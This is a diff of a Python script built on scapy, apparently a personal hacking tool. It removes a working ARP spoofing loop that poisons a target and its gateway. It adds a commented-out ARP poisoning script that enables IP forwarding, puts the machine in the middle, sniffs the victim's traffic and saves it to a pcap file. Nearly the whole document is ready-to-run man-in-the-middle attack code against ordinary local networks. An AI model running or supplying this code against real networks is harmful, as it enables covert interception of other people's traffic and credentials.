@@ -1,63 +1,129 @@
-import scapy.all as scapy
-import time
-import argparse
-
-#python network_scanner.py -t 10.0.2.1
-
-def get_arguments():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-t", "--target", dest="target",
-                        help="Target IP")
-    parser.add_argument("-g", "--gateway", dest="gateway",
-                        help="Gateway IP")
-    options = parser.parse_args()
-    return options
+from scapy.all import *
 
 
-# Get target mac address using ip address
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
-                              verbose=False)[0]
-    return answered_list[0][1].hwsrc
 
 
-# Change mac address in arp table
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
-                       psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
 
 
-# Restore mac address in arp table
-def restore(dest_ip, source_ip):
-    dest_mac = get_mac(dest_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
-                       psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
 
 
-options = get_arguments()
-sent_packets_count = 0
-try:
-    while True:
-        spoof(options.target, options.gateway)
-        spoof(options.gateway, options.target)
-        sent_packets_count += 2
-        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
-    restore(options.target, options.gateway)
-    restore(options.gateway, options.target)
-    print("\nARP table restored. Quiting")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# import os
+# import signal
+# import sys
+# import threading
+# import time
+#
+# #ARP Poison parameters
+# gateway_ip = "10.0.0.1"
+# target_ip = "10.0.0.250"
+# packet_count = 1000
+# conf.iface = "en5"
+# conf.verb = 0
+#
+# #Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
+# #an ARP reply with MAC Address
+# def get_mac(ip_address):
+#     #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
+#     #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
+#     resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
+#     for s,r in resp:
+#         return r[ARP].hwsrc
+#     return None
+#
+# #Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
+# #correct MAC and IP Address information
+# def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
+#     scapy.all.send(scapy.all.ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
+#     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
+#     print("[*] Disabling IP forwarding")
+#     #Disable IP Forwarding on a mac
+#     os.system("sysctl -w net.inet.ip.forwarding=0")
+#     #kill process on a mac
+#     os.kill(os.getpid(), signal.SIGTERM)
+#
+# #Keep sending false ARP replies to put our machine in the middle to intercept packets
+# #This will use our interface MAC address as the hwsrc for the ARP reply
+# def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
+#     print("[*] Started ARP poison attack [CTRL-C to stop]")
+#     try:
+#         while True:
+#             send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
+#             send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
+#             time.sleep(2)
+#     except KeyboardInterrupt:
+#         print("[*] Stopped ARP poison attack. Restoring network")
+#         restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+#
+# #Start the script
+# print("[*] Starting script: arp_poison.py")
+# print("[*] Enabling IP forwarding")
+# #Enable IP Forwarding on a mac
+# os.system("sysctl -w net.inet.ip.forwarding=1")
+# print(f"[*] Gateway IP address: {gateway_ip}")
+# print(f"[*] Target IP address: {target_ip}")
+#
+# gateway_mac = get_mac(gateway_ip)
+# if gateway_mac is None:
+#     print("[!] Unable to get gateway MAC address. Exiting..")
+#     sys.exit(0)
+# else:
+#     print(f"[*] Gateway MAC address: {gateway_mac}")
+#
+# target_mac = get_mac(target_ip)
+# if target_mac is None:
+#     print("[!] Unable to get target MAC address. Exiting..")
+#     sys.exit(0)
+# else:
+#     print(f"[*] Target MAC address: {target_mac}")
+#
+# #ARP poison thread
+# poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
+# poison_thread.start()
+#
+# #Sniff traffic and write to file. Capture is filtered on target machine
+# try:
+#     sniff_filter = "ip host " + target_ip
+#     print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
+#     packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
+#     wrpcap(target_ip + "_capture.pcap", packets)
+#     print(f"[*] Stopping network capture..Restoring network")
+#     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+# except KeyboardInterrupt:
+#     print(f"[*] Stopping network capture..Restoring network")
+#     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+# sys.exit(0)
 
 
 # def scanning(ip):
 #     arp_request = scapy.all.ARP(pdst=ip)
 #     broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
 #     a = arp_request /broadcast
+#python network_scanner.py -t 10.0.2.1
